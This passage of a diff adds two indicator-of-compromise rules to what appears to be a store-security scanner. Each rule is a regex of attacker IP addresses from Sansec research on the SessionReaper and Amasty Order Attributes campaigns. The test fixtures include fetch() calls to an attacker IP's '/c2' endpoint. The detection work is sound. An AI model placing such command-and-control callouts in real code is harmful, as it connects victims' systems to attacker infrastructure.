+            "name": "Attacker IPs from the SessionReaper campaign",
+            "severity": "warning",
+            "source": "https://sansec.io/research/sessionreaper",
+            "target": [
+                "cms_content",
+                "design_config",
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:23\\.146\\.184\\.93|23\\.249\\.27\\.221|34\\.227\\.25\\.4|44\\.212\\.43\\.34|45\\.32\\.66\\.51|45\\.143\\.20\\.147|54\\.205\\.171\\.35|155\\.117\\.84\\.134|159\\.89\\.12\\.166)\\b/",
+            "description": "Attacker address(es) named in this Sansec write-up. IP indicators go stale quickly; review before relying on this. Source: Sansec, Attacker IPs from the SessionReaper campaign.",
+            "test_should_match": [
+                "fetch('http://23.146.184.93/c2')"
+            ],
+            "test_should_not_match": [
+                "fetch('http://10.0.0.1/c2')"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        },
+        {
+            "id": "amasty-order-attributes-attacker-ips",
+            "name": "Attacker IPs from the Amasty Order Attributes exploitation",
+            "severity": "warning",
+            "source": "https://sansec.io/research/amasty-order-attributes-file-upload",
+            "target": [
+                "cms_content",
+                "design_config",
+                "pub_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\b(?:87\\.237\\.202\\.229|88\\.167\\.123\\.203|23\\.234\\.102\\.171|50\\.7\\.159\\.158|94\\.177\\.131\\.77|146\\.70\\.165\\.145)\\b/",
+            "description": "Attacker address(es) named in this Sansec write-up. IP indicators go stale quickly; review before relying on this. Source: Sansec, Attacker IPs from the Amasty Order Attributes exploitation.",
+            "test_should_match": [
+                "fetch('http://87.237.202.229/c2')"
+            ],
+            "test_should_not_match": [
+                "fetch('http://10.0.0.1/c2')"
+            ],
+            "ioc": true,
+            "expires_on": "2027-04-04"
+        }
+    ]
+}
